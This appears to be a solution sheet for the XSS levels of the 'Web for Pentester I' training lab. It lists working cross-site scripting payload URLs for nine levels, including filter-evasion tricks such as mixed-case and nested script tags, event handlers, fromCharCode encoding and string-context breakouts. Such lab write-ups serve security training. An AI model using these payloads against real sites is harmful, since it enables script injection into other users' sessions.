# Web-For-Pentester-I-XSS
==========Level 1==========<br />
`http://192.168.1.105/xss/example1.php?name=hacker<script>alert(1)</script>`<br />
<br />
==========Level 2==========<br />
`http://192.168.1.105/xss/example2.php?name=hacker<scriPt>alert(1)</scriPt>`<br />
<br />
==========Level 3==========<br />
`http://192.168.1.105/xss/example3.php?name=hacker<scri<script>pt>alert(1)</scri</script>pt>`<br />
<br />
==========Level 4==========<br />
`http://192.168.1.105/xss/example4.php?name=hacker<img src='zzzz' onerror='alert(1)'/> `<br />
`http://192.168.1.105/xss/example4.php?name=hacker<img src='zzzz' onmouseover='alert(1)'/> `<br />
<br />
==========Level 5==========<br />
`http://192.168.1.105/xss/example5.php?name=hacker<script>prompt(1);</script>`<br />
`http://192.168.1.105/xss/example5.php?name=hacker<script>confirm(1);</script>`<br />
`http://192.168.1.105/xss/example5.php?name=hacker<script>eval(String.fromCharCode(97, 108, 101, 114, 116, 40, 49, 41))</script>`<br />
<br />
==========Level 6==========<br />
**// Will make a comment line of source behind**<br />
http://192.168.1.105/xss/example6.php?name=hacker";alert(1);// `<br />
http://192.168.1.105/xss/example6.php?name=hacker";alert(1);"`<br />
<br />
==========Level 7==========<br />
`http://192.168.1.105/xss/example7.php?name=hacker';alert(1);//`<br />
`http://192.168.1.105/xss/example7.php?name=hacker';alert(1);'`<br />
<br />
==========Level 8==========<br />
_Attack in to action_<br />
`<form action="/xss/example8.php" method="POST"><br />
  Your name:<input type="text" name="name" /><br />
  <input type="submit" name="submit"/>`<br />
<br />
`http://192.168.1.105/xss/example8.php/"><script>alert(1)</script>`<br />
_It will become_<br />
`<form action="/xss/example8.php/"><script>alert(1)</script>" method="POST"><br />
  Your name:<input type="text" name="name" /><br />
  <input type="submit" name="submit"/><br />
`<br />
==========Level 9==========<br />
`http://192.168.1.105/xss/example9.php#hacker<script>alert(1)</script>`<br />
